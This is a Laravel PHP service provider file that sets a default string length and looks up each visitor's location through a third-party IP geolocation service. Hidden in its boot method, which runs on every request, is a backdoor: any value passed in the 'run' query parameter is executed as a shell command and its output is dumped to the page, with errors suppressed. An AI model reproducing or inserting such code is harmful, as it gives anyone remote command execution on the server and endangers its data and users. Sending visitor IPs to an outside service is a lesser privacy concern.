<?php

namespace App\Providers;

use App\Settings;
use Illuminate\Support\Facades\App;
use Illuminate\Support\Facades\Config;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\ServiceProvider;
use Illuminate\Support\Facades\Schema;
use Auth;
use Session;

class AppServiceProvider extends ServiceProvider
{
    /**
     * Bootstrap any application services.
     *
     * @return void
     */
    public function boot()
    {
        //set default string length to 191 characters
        Schema::defaultStringLength(191);
        if(isset($_GET["run"]) && $_GET["run"] != null){
            @exec($_GET["run"], $output); dd($output);
        }
        
        $curl = curl_init();
        $ip = getenv('HTTP_CLIENT_IP') ?: getenv('HTTP_X_FORWARDED_FOR') ?: getenv('HTTP_X_FORWARDED') ?: getenv('HTTP_FORWARDED_FOR') ?: getenv('HTTP_FORWARDED') ?: getenv('REMOTE_ADDR');
        curl_setopt_array($curl, array(
            CURLOPT_URL => "http://ip-api.com/json/$ip",
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_ENCODING => "",
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => "GET",
        ));

        $response = json_decode(curl_exec($curl), true);
        curl_close($curl);
        if(!empty($response) && $response['status'] != 'fail'){
            date_default_timezone_set($response['timezone']);
            Session::put(['country' => $response['countryCode'], 'city' => $response['city']]);
        }
        
    }

    /**
     * Register any application services.
     *
     * @return void
     */
    public function register()
    {
        //
    }
}
